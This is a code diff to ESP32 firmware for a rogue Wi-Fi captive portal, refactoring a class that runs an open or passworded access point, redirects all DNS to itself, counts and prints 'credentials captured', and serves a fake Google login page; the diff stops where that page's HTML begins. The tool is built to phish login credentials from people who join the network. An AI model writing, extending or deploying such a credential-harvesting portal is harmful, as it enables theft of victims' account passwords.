@@ -1,9 +1,3 @@
-#include <WiFi.h>
-#include <DNSServer.h>
-#include <WebServer.h>
-#include <Update.h>
-#include "esp_wifi.h"
-#include "Preferences.h"
 #include "captive_portal.h"
 
 // ===== Configuration Constants =====
@@ -16,8 +10,7 @@ CaptivePortal portalManager;
 
 // ===== Method Implementations =====
 
-CaptivePortal::CaptivePortal()
-  : server(80), portalRunning(false), credentialCount(0), credentialsCaptured(0) {
+CaptivePortal::CaptivePortal() : server(80), portalRunning(false), credentialCount(0), credentialsCaptured(0) {
   apIP = IPAddress(192, 168, 1, 1);
   redirectURL = "http://www.google.com";
   portalStartTime = 0;
@@ -219,21 +212,11 @@ void CaptivePortal::handleNotFound() {
 
 // ===== Portal Control =====
 bool CaptivePortal::startPortal(const String& ssid, const String& password, const String& type) {
-  if (portalRunning) {
-    stopPortal();
-    delay(1000);  // Give time for clean shutdown
-  }
-
   apSSID = ssid;
   apPassword = password;
   portalType = type;
 
   Serial.println("Initializing access point...");
-
-  // Ensure clean WiFi state
-  WiFi.disconnect(true);
-  WiFi.mode(WIFI_OFF);
-  delay(1000);
 
   WiFi.mode(WIFI_AP);
   delay(500);
@@ -253,7 +236,6 @@ bool CaptivePortal::startPortal(const String& ssid, const String& password, cons
     if (apPassword.length() >= 8) {
       apStarted = WiFi.softAP(apSSID.c_str(), apPassword.c_str());
     } else {
-      // Use open network if password is too short or empty
       apStarted = WiFi.softAP(apSSID.c_str());
     }
 
@@ -261,7 +243,6 @@ bool CaptivePortal::startPortal(const String& ssid, const String& password, cons
       retryCount++;
       delay(1000);
 
-      // Reset WiFi on failure
       if (retryCount < maxRetries) {
         WiFi.softAPdisconnect(true);
         delay(500);
@@ -278,14 +259,12 @@ bool CaptivePortal::startPortal(const String& ssid, const String& password, cons
 
   Serial.println("AP started successfully, starting DNS server...");
 
-  // Start DNS server for captive portal
   if (!dnsServer.start(DNS_PORT, "*", WiFi.softAPIP())) {
     Serial.println("Failed to start DNS server");
     WiFi.softAPdisconnect(true);
     return false;
   }
 
-  // Configure web server routes
   server.on("/", HTTP_GET, [this]() {
     this->handleRoot();
   });
@@ -325,7 +304,6 @@ bool CaptivePortal::startPortal(const String& ssid, const String& password, cons
   portalRunning = true;
   portalStartTime = millis();
 
-  // Load previous credentials
   loadFromPreferences();
 
   Serial.println("\n=== CAPTIVE PORTAL STARTED ===");
@@ -333,6 +311,7 @@ bool CaptivePortal::startPortal(const String& ssid, const String& password, cons
   Serial.println("Password: " + (apPassword.length() >= 8 ? apPassword : "(open)"));
   Serial.println("Type: " + portalType);
   Serial.println("IP: " + WiFi.softAPIP().toString());
+  Serial.println("MAC: " + getAPMAC());
   Serial.println("Clients: " + String(WiFi.softAPgetStationNum()));
   Serial.println("=============================\n");
 
@@ -349,9 +328,6 @@ void CaptivePortal::stopPortal() {
   WiFi.softAPdisconnect(true);
   delay(100);
 
-  WiFi.mode(WIFI_OFF);
-  delay(100);
-
   portalRunning = false;
   Serial.println("Portal stopped");
 }
@@ -362,21 +338,6 @@ void CaptivePortal::update() {
     server.handleClient();
     cleanupOldClients();
   }
-}
-
-// ===== Status & Information =====
-void CaptivePortal::printStatus() {
-  Serial.println("\n=== CAPTIVE PORTAL STATUS ===");
-  Serial.println("Running: " + String(portalRunning ? "YES" : "NO"));
-  if (portalRunning) {
-    Serial.println("SSID: " + apSSID);
-    Serial.println("Type: " + portalType);
-    Serial.println("Clients: " + String(WiFi.softAPgetStationNum()));
-    Serial.println("Uptime: " + String((millis() - portalStartTime) / 1000) + "s");
-    Serial.println("IP: " + WiFi.softAPIP().toString());
-  }
-  Serial.println("Credentials captured: " + String(credentialsCaptured));
-  Serial.println("============================\n");
 }
 
 void CaptivePortal::printCredentials() {
@@ -413,6 +374,24 @@ void CaptivePortal::clearCredentials() {
   Serial.println("All credentials cleared");
 }
 
+// ===== New Methods =====
+String CaptivePortal::getAPIP() {
+  return WiFi.softAPIP().toString();
+}
+
+String CaptivePortal::getAPMAC() {
+  uint8_t mac[6];
+  esp_wifi_get_mac(WIFI_IF_AP, mac);
+  char macStr[18];
+  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", 
+           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+  return String(macStr);
+}
+
+void CaptivePortal::setRedirectURL(const String& url) {
+  redirectURL = url;
+}
+
 // ===== Getters =====
 bool CaptivePortal::isRunning() {
   return portalRunning;
@@ -429,8 +408,6 @@ unsigned long CaptivePortal::getCredentialsCaptured() {
 int CaptivePortal::getClientCount() {
   return WiFi.softAPgetStationNum();
 }
-
-// ===== HTML Template Methods - ALL IMPLEMENTED =====
 
 const char* CaptivePortal::getGoogleLoginPage() {
   return R"rawliteral(
